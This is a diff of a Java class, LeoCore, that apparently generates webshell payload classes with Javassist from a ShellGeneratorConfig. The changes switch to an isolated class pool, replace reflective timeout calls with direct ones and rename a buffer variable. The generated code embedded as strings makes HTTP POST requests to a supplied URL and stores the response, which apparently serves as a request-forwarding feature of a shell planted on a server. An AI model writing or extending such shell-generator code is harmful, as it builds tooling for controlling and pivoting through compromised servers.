@@ -14,8 +14,9 @@ public class LeoCore {
     }
 
     public CtClass dump(String classname, ShellGeneratorConfig config) throws CannotCompileException, NotFoundException {
-        // 每次操作创建独立子池，继承父池类路径但互不影响，避免并发竞争
-        ClassPool pool = new ClassPool(ClassPool.getDefault());
+        // 生成代码只引用 JDK 类型，使用完全独立的类池，避免默认池被其他模板重映射后污染类型解析。
+        ClassPool pool = new ClassPool(null);
+        pool.appendSystemPath();
         CtClass ctClass = pool.makeClass(classname);
         ctClass.getClassFile().setVersionToJava5();
         CtClass ctClass0 = pool.get("java.lang.ClassLoader");
@@ -100,10 +101,8 @@ public class LeoCore {
                                                  "        java.net.URL u = new java.net.URL(rUrl);\n" +
                                                  "        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();\n" +
                                                  "        conn.setRequestMethod(\"POST\");\n" +
-                                                 "        try {\n" +
-                                                 "            conn.getClass().getMethod(\"setConnectTimeout\", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});\n" +
-                                                 "            conn.getClass().getMethod(\"setReadTimeout\", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});\n" +
-                                                 "        } catch (Exception e) {}\n" +
+                                                 "        conn.setConnectTimeout(3000);\n" +
+                                                 "        conn.setReadTimeout(0);\n" +
                                                  "        conn.setDoOutput(true);\n" +
                                                  "        conn.setDoInput(true);\n" +
                                                  "        if (javax.net.ssl.HttpsURLConnection.class.isInstance(conn)) {\n" +
@@ -141,10 +140,10 @@ public class LeoCore {
                                                  "            inputStream = conn.getErrorStream();\n" +
                                                  "        }\n" +
                                                  "        java.io.ByteArrayOutputStream result = new java.io.ByteArrayOutputStream();\n" +
-                                                 "        byte[] buffer = new byte[1024];\n" +
+                                                 "        byte[] var4 = new byte[1024];\n" +
                                                  "        int length;\n" +
-                                                 "        while ((length = inputStream.read(buffer)) != -1) {\n" +
-                                                 "            result.write(buffer, 0, length);\n" + "        }\n" +
+                                                 "        while ((length = inputStream.read(var4)) != -1) {\n" +
+                                                 "            result.write(var4, 0, length);\n" + "        }\n" +
                                                  "        " + config.getFieldResults() + ".put(\"reqUrl\",rUrl);\n" +
                                                  "        " + config.getFieldResults() + ".put(\"respData\",result.toByteArray());\n" +
                                                  "    }", ctClass);
